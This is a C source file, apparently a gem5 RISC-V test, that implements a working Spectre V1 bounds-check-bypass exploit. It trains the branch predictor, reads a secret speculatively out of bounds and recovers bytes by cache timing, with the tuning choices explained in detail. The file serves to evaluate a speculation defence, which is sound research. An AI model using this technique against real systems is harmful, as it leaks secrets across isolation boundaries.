/*
 * Spectre V1 (bounds-check bypass / out-of-bounds speculation), SE mode.
 *
 * A port of the canonical Spectre V1 demonstration to RISC-V, keeping its
 * structure:
 *
 *     int fetch_function(size_t idx) {
 *         if (idx < arr1_size)
 *             return arr2[arr1[idx] * 512];
 *         return -1;
 *     }
 *
 * with a small "public" table (arr1), a large "private" table (arr2), and a
 * secret string as the attacker's goal.  The attacker picks an index such that
 * &arr1[target_idx] lands on the secret, so the out-of-bounds read yields
 * secret bytes; each byte then forms an address into arr2.  Probing arr2
 * recovers the byte.
 *
 * The two-level indirection is the point and is not incidental: the first load
 * leaks the secret, the second turns it into a cache footprint.  A version that
 * computes an address straight from a secret value tests something weaker.
 *
 * Creating the window, portably
 * ----------------------------
 * The original uses _mm_clflush(&arr1_size): it evicts the bounds variable and
 * nothing else, so the branch takes memory latency to resolve while the body's
 * loads -- whose addresses are ready immediately -- issue long before.  Without
 * that asymmetry the branch resolves first, the body is squashed before the
 * dependent load can issue, and nothing is fetched to observe.
 *
 * gem5's RISC-V has no usable targeted flush: cbo.inval requires senvcfg.cbie
 * and Zicbom is not in the default ISA, and clflush is x86.  So this port
 * reproduces the same asymmetry the only way available -- evict the whole cache,
 * then re-warm everything except the bounds variable:
 *
 *     evict_all()      touch a buffer larger than L1
 *     warm_secret()    touch the secret, so the out-of-bounds read is an L1 hit
 *     -> bounds_line is still cold, so the victim's branch is slow
 *     -> the out-of-bounds read is hot, so its result is available immediately
 *
 * That is semantically what flushing a single variable does.  It is a
 * substitution for the intrinsic, not a translation of it.
 *
 * This uses no Load Value Prediction.  The only speculation is the branch
 * predictor mispredicting the bounds check, which is the original Spectre V1.
 *
 * Pass condition is not output equivalence -- the signal is a timing
 * measurement, so it cannot be expressed as a diff.  The pass condition is that
 * the top-scored candidate matches the secret byte when unprotected and does
 * not when protected:
 *
 *   stock cache,  LVP off   expect LEAK
 *   SpaceSpec on, LVP off   expect NO-LEAK
 *   DIVERT=0,       LVP off expect LEAK   (control: the divert is load-bearing)
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>

#define ARR1_SIZE      16
#define ARR2_STRIDE    512
#define NUM_PROBES     256

#define TRAIN_ITERS    40
#define NUM_TRIES      6
#define CACHE_HIT_THRESHOLD 40

/*
 * The victim reads the table out of bounds, so the table and the secret need a
 * known, large gap between them.  A struct guarantees the layout; separate
 * globals would depend on linker ordering, and if the secret happened to land
 * within ARR1_SIZE of the table the attack would silently stop working.
 */
struct __attribute__((aligned(64))) region_s {
    uint8_t table[160];
    uint8_t pad[4032];
    char goal[24];
};

static struct region_s region;

/*
 * The bounds limit, alone on its own cache line, and never re-warmed.  Its being
 * cold is what delays the branch.  This is the object _mm_clflush would target.
 */
static volatile uint64_t __attribute__((aligned(64))) bounds_line[8];

#define ARR1_SIZE_SLOT 0

/* The private table the attacker probes.  Larger than L1 so it can be evicted. */
static uint8_t arr2[NUM_PROBES * ARR2_STRIDE];

/* Swept to evict the data cache.  Larger than any L1 this runs on. */
static uint8_t evict_buf[128 * 1024];

static volatile uint32_t sink;

static inline uint64_t
rdcycle(void)
{
    uint64_t c;
    asm volatile("csrrs %0, cycle, x0" : "=r"(c) :: "memory");
    return c;
}

/*
 * Evict the data cache by sweeping a buffer larger than it.
 *
 * Read-only on purpose.  An earlier version accumulated into a global here,
 * which dirtied every line it touched and turned each eviction into a
 * writeback; at ~1000 calls that dominated the runtime.  Summing into a local
 * and storing once keeps every line clean, so eviction is just a tag update.
 */
static void
evict_all(void)
{
    const uint8_t *p = evict_buf;
    uint64_t acc = 0;
    for (size_t i = 0; i < sizeof(evict_buf); i += 64) {
        acc += p[i];
    }
    sink += acc;
}

/*
 * Re-warm the secret, and only the secret.
 *
 * This is what makes the body fast while the branch stays slow.  The
 * out-of-bounds read must be an L1 hit so that its result -- a secret byte --
 * is available almost immediately, giving arr2[that * STRIDE] a chance to issue
 * long before the bounds check resolves.  bounds_line is deliberately left cold.
 */
static void
warm_secret(void)
{
    const volatile char *s = region.goal;
    for (int i = 0; i < 16; i++) {
        sink += (uint32_t)s[i];
    }
}

/*
 * The victim.  Deliberately noinline with nothing compile-time constant.
 *
 * Both array reads go through volatile pointers, and that is load-bearing
 * rather than decoration.  Neither read has a side effect, so if the caller
 * discards the result the compiler deletes the whole body: at -O2 an earlier
 * version of this function collapsed to a single load of bounds_line and a ret,
 * leaving no attack at all.  An attack whose leaking loads have been optimised
 * away reports "no leak" for the uninteresting reason that it never accessed
 * anything.  The call site also folds the result into a volatile sink, so the
 * value is required as well as the loads.
 */
__attribute__((noinline))
static int
fetch_function(size_t idx)
{
    /* Cold load: costs memory latency, and does not depend on idx. */
    size_t lim = bounds_line[ARR1_SIZE_SLOT];

    if (idx < lim) {
        const volatile uint8_t *pub = region.table;
        volatile uint8_t *priv = arr2;
        /* Out of bounds when idx == target: reads the secret string. */
        uint8_t b = pub[idx];
        /* Secret byte becomes an address into the private table. */
        return priv[(size_t)b * ARR2_STRIDE];
    }
    return -1;
}

int
main(void)
{
    /* Deterministic "public" table; the values are irrelevant to the attack. */
    static const uint8_t init[ARR1_SIZE] =
        {16, 93, 45, 96, 4, 8, 41, 203, 15, 49, 56, 59, 62, 97, 112, 186};
    memcpy(region.table, init, sizeof(init));
    memcpy(region.goal, "PODA KUTTA!", 12);

    bounds_line[ARR1_SIZE_SLOT] = ARR1_SIZE;

    for (size_t i = 0; i < sizeof(arr2); i++) {
        arr2[i] = 1;   /* fault the pages in rather than relying on CoW zeros */
    }

    /*
     * The index whose &table[idx] lands on the secret.  Guaranteed out of
     * bounds because of the padding in `region`.  It advances by one per round
     * so each round attacks the next secret byte; leaving it fixed would have
     * every round read goal[0] while expecting a different byte.
     */
    size_t target = (size_t)(region.goal - (char *)region.table);

    printf("spectre_v1 start  target=%d (bounds=%d)  secret=\"%s\"\n",
           (int)target, ARR1_SIZE, region.goal);
    fflush(stdout);

    char recovered[7];
    int correct = 0;

    for (int round = 0; round < 6; round++) {
        uint8_t want = (uint8_t)region.goal[round];
        size_t round_target = target + round;

        /* hits[b] counts tries in which probe b looked like an L1 hit. */
        static int hits[NUM_PROBES];
        memset(hits, 0, sizeof(hits));

        for (int tries = 0; tries < NUM_TRIES; tries++) {
            /* An in-bounds index, to train the predictor towards "not taken". */
            size_t train_idx = tries % ARR1_SIZE;

            /*
             * Train on an unbroken run of in-bounds calls, then attack once.
             *
             * Interleaving the attack into the training loop, as the original
             * does with its ATTACK_LEAP stride, makes the branch outcome a
             * short periodic pattern.  gem5's TAGE has enough history to learn
             * a period-12 loop and then predicts the attack iteration correctly,
             * so nothing is ever mispredicted and there is nothing to observe.
             * A long run of one outcome followed by a single exception is the
             * case branch predictors are actually bad at, which is what makes
             * the attack work here.
             */
            for (int i = 0; i < TRAIN_ITERS; i++) {
                evict_all();
                warm_secret();
                /* Consume the result, or the victim's loads are dead code. */
                sink += (uint32_t)fetch_function(train_idx);
            }

            /* The attack: exactly one out-of-bounds call. */
            evict_all();
            warm_secret();
            sink += (uint32_t)fetch_function(round_target);

            /*
             * Probe.  Each candidate is a distinct cache line because of the
             * 512-byte stride.  The secret's line arrived from the fill that
             * the squashed load triggered.
             */
            for (int b = 0; b < NUM_PROBES; b++) {
                volatile uint8_t *addr = &arr2[(size_t)b * ARR2_STRIDE];
                uint64_t c1 = rdcycle();
                uint8_t v = *addr;
                asm volatile("" : "+r"(v) : : "memory");
                uint64_t d = rdcycle() - c1;
                if (d <= CACHE_HIT_THRESHOLD) {
                    hits[b]++;
                }
            }
        }

        /* Highest score wins; the threshold keeps noise from being reported. */
        int best = 0;
        for (int b = 1; b < NUM_PROBES; b++) {
            if (hits[b] > hits[best]) {
                best = b;
            }
        }

        int got = (hits[best] > NUM_TRIES / 2);
        recovered[round] = got ? (char)best : '?';
        correct += got && (best == want);

        printf("round %2d: want=0x%02x('%c')  got=0x%02x('%c')  "
               "score=%d/%d  [%s]\n",
               round, want, (want >= 32 && want < 127) ? want : '.',
               best, (best >= 32 && best < 127) ? best : '.',
               hits[best], NUM_TRIES, got ? "LEAK" : "NO-LEAK");
        fflush(stdout);
    }

    recovered[6] = '\0';
    printf("spectre_v1 rec \"%s\"  correct=%d/6  want=\"%s\"  verdict=%s\n",
           recovered, correct, region.goal, correct >= 3 ? "LEAK" : "NO-LEAK");

    return 0;
}
